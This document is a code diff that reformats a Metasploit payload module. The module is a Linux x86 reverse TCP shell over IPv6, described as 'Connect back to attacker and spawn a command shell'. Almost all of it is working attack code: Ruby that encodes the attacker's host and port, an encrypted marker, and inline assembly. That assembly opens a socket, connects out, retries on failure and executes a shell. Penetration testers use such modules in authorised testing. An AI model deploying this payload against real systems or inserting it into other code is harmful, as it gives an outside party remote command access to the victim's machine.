@@ -1,54 +1,55 @@
 # -*- coding: binary -*-
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 module MetasploitModule
+  CachedSize = 158
 
-    CachedSize = 158
-  
-    include Msf::Payload::Single
-    include Msf::Payload::Linux
-    include Msf::Sessions::CommandShellOptions
-    include Rex::Crypto
-  
-    def initialize(info = {})
-      super(merge_info(info,
-        'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
-        'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
-        'Author'        => 'Siras',
-        'License'       => MSF_LICENSE,
-        'Platform'      => 'linux',
-        'Arch'          => ARCH_X86,
-        'Handler'       => Msf::Handler::ReverseTcp,
-        'Session'       => Msf::Sessions::CommandShellUnix
-      ))
-    end
-  
-  def generate(opts={})
-        # tcp port conversion
-        port_order = ([1,0]) # byte ordering
-        tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
-        tcp_port.pop     # removes the first useless / from  the array
-        tcp_port.shift   # removes the last useless  / from  the array
-        tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
-  
-        iconn = datastore['IHOST']
-        iconn += ":"
-        iconn += datastore['IPORT']
-        n = rand(7...50)
-        r = Random.new.bytes(n-n%4)
-  
-        magic = r
-        magic += Aes256.encrypt_aes256(datastore['IV'] , datastore['KEY'], iconn)
-  
-        # ipv6 address conversion
-        # converts user's input into ipv6 hex representation
-        words = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/..../).map {|i| i.unpack('V').first.to_s(16)}
-        payload_data =<<-EOS
+  include Msf::Payload::Single
+  include Msf::Payload::Linux
+  include Msf::Sessions::CommandShellOptions
+  include Rex::Crypto
+
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
+        'Description' => 'Connect back to attacker and spawn a command shell over IPv6',
+        'Author' => 'Siras',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X86,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShellUnix
+      )
+      )
+  end
+
+  def generate(_opts = {})
+    # tcp port conversion
+    port_order = [1, 0] # byte ordering
+    tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
+    tcp_port.pop     # removes the first useless / from  the array
+    tcp_port.shift   # removes the last useless  / from  the array
+    tcp_port = (port_order.map { |x| tcp_port[x] }).join('') # reorder the array and convert it to a string.
+
+    iconn = datastore['IHOST']
+    iconn += ':'
+    iconn += datastore['IPORT']
+    n = rand(7...50)
+    r = Random.new.bytes(n - n % 4)
+
+    magic = r
+    magic += Aes256.encrypt_aes256(datastore['IV'], datastore['KEY'], iconn)
+
+    # ipv6 address conversion
+    # converts user's input into ipv6 hex representation
+    words = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/..../).map { |i| i.unpack('V').first.to_s(16) }
+    payload_data = <<-EOS
           xor  ebx,ebx
           mul  ebx
           push 0x6
@@ -59,7 +60,7 @@ module MetasploitModule
           mov  bl,0x1
           int  0x80
           mov  esi,eax
-  
+
         connect:
           xor  ecx,ecx
           xor  ebx,ebx
@@ -102,16 +103,15 @@ module MetasploitModule
           int 0x80
           xor  eax,eax
           mov  al, 0x04
-        EOS
-  
-        magic.reverse.bytes.each_slice(4){|word|
-          payload_data +=<<-EOS
-          push 0x#{word.pack("C*").unpack('H*')[0]}
-        EOS
-      }
-        
-  
-        payload_data +=<<-EOS
+    EOS
+
+    magic.reverse.bytes.each_slice(4) do |word|
+      payload_data += <<-EOS
+          push 0x#{word.pack('C*').unpack('H*')[0]}
+      EOS
+    end
+
+    payload_data += <<-EOS
           mov  dl, 0x#{'%02x' % magic.length}
           xor  ebx, ebx
           mov  ecx, esp
@@ -128,7 +128,7 @@ module MetasploitModule
           mov al,0xb
           int 0x80
           ret
-  
+
         retry:
           xor ebx,ebx
           push ebx
@@ -139,13 +139,13 @@ module MetasploitModule
           int 0x80
           jmp connect
           ret
-  
+
         exit:
           xor eax,eax
           mov al,0x1
           int 0x80
-      EOS
-  
-      Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
-    end
+    EOS
+
+    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
   end
+end
